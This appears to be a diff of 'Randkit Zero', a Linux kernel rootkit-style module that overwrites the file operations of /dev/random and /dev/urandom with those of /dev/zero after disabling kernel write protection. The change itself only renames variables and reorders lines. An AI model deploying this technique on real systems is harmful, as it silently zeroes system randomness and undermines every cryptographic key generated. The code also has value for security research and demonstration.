@@ -8,12 +8,12 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Vincent Rasneur <vrasneur@free.fr>");
 MODULE_DESCRIPTION("Randkit Zero: replaces /dev/(u)random with /dev/zero");
 
-static struct file_operations *zero_fops;
-static struct file_operations *random_fops;
-static struct file_operations *urandom_fops;
+static struct file_operations *urandom_fops_ptr;
+static struct file_operations *random_fops_ptr;
+static struct file_operations *zero_fops_ptr;
 
-static struct file_operations saved_random_fops;
 static struct file_operations saved_urandom_fops;
+static struct file_operations saved_random_fops;
 
 typedef long (*rk_sys_getrandom_fun)(char __user *, size_t, unsigned int);
 
@@ -131,18 +131,18 @@ static void rk_patch_fops(void)
 {
     printk(KERN_INFO "saving random fops\n");
     
-    zero_fops = rk_get_fops(5);
-    random_fops = rk_get_fops(8);
-    urandom_fops = rk_get_fops(9);
-    
-    saved_random_fops = *random_fops;
-    saved_urandom_fops = *urandom_fops;
+    urandom_fops_ptr = rk_get_fops(9);
+    random_fops_ptr = rk_get_fops(8);
+    zero_fops_ptr = rk_get_fops(5);
 
+    saved_urandom_fops = *urandom_fops_ptr;
+    saved_random_fops = *random_fops_ptr;
+    
     printk(KERN_INFO "patching random fops\n");
   
     RK_DISABLE_WP
-    *random_fops = *zero_fops;
-    *urandom_fops = *zero_fops;
+    *urandom_fops_ptr = *zero_fops_ptr;
+    *random_fops_ptr = *zero_fops_ptr;
     RK_ENABLE_WP
 
     printk(KERN_INFO "patching done\n");
@@ -194,8 +194,8 @@ static void rk_restore_fops(void)
     printk(KERN_INFO "restoring random fops\n");
 
     RK_DISABLE_WP
-    *random_fops = saved_random_fops;
-    *urandom_fops = saved_urandom_fops;
+    *urandom_fops_ptr = saved_urandom_fops;
+    *random_fops_ptr = saved_random_fops;
     RK_ENABLE_WP
 
     printk(KERN_INFO "restoring done\n");
